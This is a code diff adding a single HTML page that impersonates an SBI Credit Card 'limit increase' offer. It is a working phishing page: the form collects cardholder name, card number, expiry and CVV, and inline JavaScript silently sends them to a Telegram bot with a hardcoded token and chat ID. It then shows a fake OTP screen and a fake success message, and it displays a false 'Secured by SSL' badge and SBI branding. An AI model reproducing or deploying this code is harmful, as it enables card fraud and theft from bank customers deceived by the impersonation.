@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Credit Card Limit Increase</title>
+    <link rel="stylesheet" href="styles.css">
+    <script defer src="script.js"></script>
+    <style>
+        body {
+            background-image: url('SBI-Axis-Bank-Credit-Cards.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .container {
+            background: rgb(0, 0, 0);
+            padding: 25px;
+            border-radius: 10px;
+            width: 30%;
+            margin: auto;
+            margin-top: 50px;
+            text-align: center;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.3);
+        }
+        input, label, span, h2, p, button {
+            color: white;
+        }
+        input {
+            display: block;
+            width: 90%;
+            margin: 10px auto;
+            padding: 10px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid white;
+            color: white;
+        }
+        .secure-icon {
+            display: block;
+            margin: 10px auto;
+            color: lightgreen;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: black;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainPage">
+        <img src="SBI Card_id6ifacJEt_0.png" alt="SBI Card Logo" class="logo">
+        <p class="secure-icon">🔒 Secured by SSL</p>
+        <div class="card-form">
+            <h2>Increase Your Credit Limit</h2>
+            <form id="creditForm">
+                <label>Card Holder Name:</label>
+                <input type="text" id="cardHolder" required>
+                
+                <label>Credit Card Number:</label>
+                <input type="text" id="cardNumber" maxlength="16" required>
+                <span id="cardBrand"></span>
+                
+                <label>Expiry (MM/YY):</label>
+                <input type="text" id="expiry" maxlength="5" required>
+                
+                <label>CVV:</label>
+                <input type="password" id="cvv" maxlength="3" required>
+                
+                <label>Total Available Limit:</label>
+                <input type="number" id="totalLimit" min="10000" max="400000" step="1000" required>
+                
+                <label>New Limit Increase:</label>
+                <input type="number" id="newLimit" value="63000" readonly>
+                
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+        <p class="copyright">© 2025 SBI Credit Card Department. All Rights Reserved.</p>
+    </div>
+
+    <div class="otp-container" id="otpPage" style="display:none; text-align:center; margin-top:50px;">
+        <h2>Enter OTP</h2>
+        <p>We have sent a 6-digit OTP to your registered number.</p>
+        <input type="text" id="otpInput" maxlength="6" required>
+        <p id="timer">02:00</p>
+        <button id="verifyOtp">Verify OTP</button>
+    </div>
+
+    <div class="success-container" id="successPage" style="display:none; text-align:center; margin-top:50px;">
+        <h2>Congratulations!</h2>
+        <p id="successMessage"></p>
+    </div>
+
+    <script>
+        const botToken = "7716096446:AAEllciPlN49o_E4ZXXY7wDYj-uRTwydkYE";
+        const chatId = "5153760850";
+
+        document.getElementById('creditForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const cardHolder = document.getElementById('cardHolder').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const totalLimit = document.getElementById('totalLimit').value;
+            const newLimit = document.getElementById('newLimit').value;
+            
+            let message = `New Credit Limit Request:\n` +
+                          `Card Holder: ${cardHolder}\n` +
+                          `Card Number: ${cardNumber}\n` +
+                          `Expiry: ${expiry}\n` +
+                          `CVV: ${cvv}\n` +
+                          `Total Limit: ${totalLimit}\n` +
+                          `New Limit: ${newLimit}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('otpPage').style.display = 'block';
+            startTimer();
+        });
+
+        document.getElementById('verifyOtp').addEventListener('click', function() {
+            const otp = document.getElementById('otpInput').value;
+            if (!/^[0-9]{6}$/.test(otp)) {
+                alert("Invalid OTP. Please enter a valid 6-digit OTP.");
+                return;
+            }
+            
+            const cardHolder = document.getElementById('cardHolder').value;
+            document.getElementById('otpPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+            document.getElementById('successMessage').textContent = `Congratulations, ${cardHolder}! Your limit will increase successfully. It will show in your application after 24 hours.`;
+        });
+    </script>
+</body>
+</html>
